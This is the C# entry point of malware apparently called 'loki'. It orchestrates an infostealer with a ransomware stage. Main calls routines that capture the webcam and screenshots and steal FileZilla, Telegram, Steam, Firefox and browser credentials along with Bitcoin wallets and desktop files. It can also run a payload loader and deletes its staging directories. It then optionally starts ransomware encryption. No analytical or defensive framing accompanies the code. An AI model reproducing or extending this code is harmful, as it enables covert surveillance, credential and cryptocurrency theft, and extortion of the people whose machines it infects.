namespace loki
{
    using System;
    using System.IO;
    using loki;
    using loki.Ransomware;
    using loki.Stealer;
    using loki.Utilies;
    using loki.Utilies.App;
    using loki.Utilies.Hardware;
    using loki.Utilies.Wallets;
    using Loki.Utilities;

    internal static partial class Program
    {
        public static string dir = $"{Path.GetTempPath()}\\AX754VD.tmp";

        [STAThread]
        private static void Main()
        {
            Directory.CreateDirectory(dir);
            HomeDirectory.Create(GetDirPath.User_Name, true);
            if (Settings.webka)
            {
                GetWebCam.Get_webcam();
            }
            Screen.Get_scr(dir);

            FileZilla.get_filezilla(dir);
            Telegram.StealTelegram(dir);
            if (Settings.steam)
            {
                Steam.StealSteam(dir);
            }
            if (Settings.loader)
            {
                Loader.Load();
            }
            if (Settings.grabber)
            {
                Grabber.Grab_desktop(dir);
            }
            Mozila.Mozila_still();
            Wallets.BitcoinSteal(dir);
            UserAgents.Get_agent(dir);
            Browser_Parse.Parse(dir);      
            Hardware.Info(dir);
            Directory.Delete(dir, true);
            Directory.Delete(GetDirPath.User_Name, true);
            if (Settings.ransomware)
            {
                RansomwareCrypt.Start();
            }
        }
    }
}